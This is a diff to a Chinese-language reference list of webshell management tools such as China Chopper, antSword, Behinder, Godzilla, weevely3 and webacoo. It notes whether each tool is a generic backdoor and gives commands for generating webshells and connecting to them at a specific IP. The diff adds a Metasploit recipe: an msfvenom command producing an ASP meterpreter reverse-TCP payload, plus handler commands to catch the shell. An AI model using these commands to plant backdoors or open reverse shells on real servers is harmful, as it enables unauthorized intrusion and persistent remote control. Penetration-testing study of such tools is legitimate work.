@@ -5,26 +5,43 @@ WebShell管理工具
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `菜刀 <https://github.com/Chora10/Cknife>`_
 	+ 支持asp，jsp，php，不支持HTTPS。
+	+ 一句话木马通用后门。
 - `Cknife <https://github.com/Chora10/Cknife>`_
 	+ 支持asp，jsp，php，支持HTTPS。
+	+ 一句话木马通用后门。
 - `antSword <https://github.com/antoor/antSword>`_
 	+ 支持asp，jsp，php。
+	+ 一句话木马通用后门。
 - `冰蝎 <https://github.com/rebeyond/Behinder>`_
 	+ 动态二进制加密网站管理客户端，支持java,.net,php，HTTPS。
+	+ 非通用后门。
 - `Altman <https://github.com/keepwn/Altman>`_ 
 	+ 支持asp，jsp，php。
 - `Webshell Sniper <https://github.com/WangYihang/Webshell-Sniper>`_ 
 	+ 仅支持在类Unix系统上运行。
 - `quasibot <https://github.com/Smaash/quasibot>`_ complex webshell manager, quasi-http botnet
 - webacoo
-	+ 仅支持PHP。
-	+ 生成webshell：webacoo -g -o webacootest.php
-	+ 连接后门：webacoo -t -u http://106.54.74.40/webacootest.php
+	+ 仅支持PHP，非通用后门。
+	+ 生成webshell： ``webacoo -g -o webacootest.php`` 
+	+ 连接后门： ``webacoo -t -u http://106.54.74.40/webacootest.php`` 
 - `weevely3 <https://github.com/epinna/weevely3>`_ Weaponized web shell
-	+ 仅支持PHP。
-	+ 生成webshell：weevely generate weevelytest ./weevelyphp.php
-	+ 连接后门：weevely http://106.54.74.40/weevelyphp.php weevelytest
+	+ 仅支持PHP，非通用后门。
+	+ 生成webshell： ``weevely generate weevelytest ./weevelyphp.php`` 
+	+ 连接后门： ``weevely http://106.54.74.40/weevelyphp.php weevelytest`` 
 	+ 连接成功后，输入help，可以查看支持的命令和功能，注意执行模板命令需要加:号。
+- `Godzilla哥斯拉 <https://github.com/BeichenDream/Godzilla>`_
+	+ 支持asp，jsp，php，支持HTTPS。
+	+ 非通用后门。
+- Metasploit生成后门
+	+ ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.131 -f asp > shell.asp`` 
+	+ 连接后门
+		::
+		
+			use exploit/multi/handler
+			set PAYLOAD windows/meterpreter/reverse_tcp
+			set LHOST 10.10.10.131
+			exploit
+			打开页面：http://10.10.10.130/shell.asp
 
 WebShell
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
